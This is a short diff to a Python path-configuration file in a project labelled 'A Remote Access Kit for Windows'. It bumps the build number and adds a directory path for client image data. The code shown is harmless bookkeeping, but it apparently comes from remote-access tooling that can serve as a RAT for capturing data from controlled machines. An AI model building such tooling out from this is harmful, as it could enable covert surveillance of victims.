@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import os
 
@@ -75,3 +75,8 @@ class BGPath:
 class BuilderPath:
     def __init__(self):
         self.raw_script_dir = LoggingUtilitys().get_misc_file_path_str('agent/raw')
+
+#Client data related file and dir paths
+class ClientPath:
+    def __init__(self):
+        self.image_data_dir = LoggingUtilitys().get_misc_file_path_str('client_data/image_data/')
